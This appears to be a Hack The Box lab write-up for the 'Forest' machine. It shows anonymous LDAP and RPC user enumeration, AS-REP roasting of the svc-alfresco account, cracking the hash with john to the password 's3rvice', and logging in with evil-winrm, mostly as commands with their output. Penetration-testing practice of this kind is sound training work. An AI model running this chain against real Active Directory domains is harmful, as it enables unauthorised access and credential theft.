# 10 - LDAP

# Naming Contexts
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/forest]
└──╼ $ ldapsearch -x -h 10.10.10.161 -s base  namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```


# Users
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/forest]
└──╼ $ rpcclient -U ''  -N   htb.local
rpcclient $> enum
enumalsgroups              enumdomains                enumdrivers                enumkey                    enumports                  enumprocdatatypes          
enumdata                   enumdomgroups              enumforms                  enummonitors               enumprinters               enumprocs                  
enumdataex                 enumdomusers               enumjobs                   enumpermachineconnections  enumprivs                  enumtrust                  
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 
```

`rpcclient> queryuser <id>` gives more information about a user including their last name.

# users.lst
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/forest]
└──╼ $ cat users.lst 
sebastien
lucinda
svc-alfresco
andy
mark
santi
```


# ASREProasting
```sql
┌─[user@parrot]─[10.10.14.18]─[~/htb/forest]
└──╼ $ impacket-GetNPUsers -usersfile username.lst  -dc-ip 10.10.10.161 htb.local/
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:acef1b6199725aa53430a7c0b2401ee9$1fd87d157d5e6e2a7e2ea6d30cc85146b90f30b31f75db41e1a62d63f0df1feb0a694cec9b56fa1ab59d5a8ab2fd527e20d78995b09cb87a408627fc8dcbdfb5a7e4834f6fee6779f9539b248fb321ac3e3734e61faad80c90e0fc88bb4dcf9fbb414f50301887881f290dbf3efbead49eb3a49094a6d905dee64d1fc4d9173760a2d5fcc894d291aaf944cd0940118c67c1adf32afeb73fe03ebc7bbf0a1268d20899f5fc32c489c1ddc8a43f5f5157e2587891669a5b6b727438a364a73e9481fd9fcd674b7d30863f3a02c9486508d24907373f4a05cb5e2e82134c64496df34d5e3598ac
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```



# Cracked
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/forest]
└──╼ $ john  hash  -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:06 DONE (2021-08-03 12:22) 0.1631g/s 666518p/s 666518c/s 666518C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

# Shell
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/forest]
└──╼ $ evil-winrm -i 10.10.10.161 -u svc-alfresco  -p s3rvice 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>whoami
htb\svc-alfresco
```